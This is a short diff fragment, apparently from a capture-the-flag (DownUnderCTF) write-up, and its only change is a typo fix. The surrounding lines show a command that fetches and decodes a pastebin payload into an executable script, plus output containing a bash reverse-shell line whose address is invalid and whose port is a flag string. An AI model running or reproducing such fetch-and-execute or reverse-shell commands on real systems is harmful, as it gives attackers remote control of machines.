@@ -78,7 +78,7 @@ if __name__ == "__main__" :
 </pre> 
 full output is code is
 <code>
-ull command to execute:
+full command to execute:
 curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d > temp.sh && chmod +x temp.sh && strings temp.sh
 Command output:
 bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
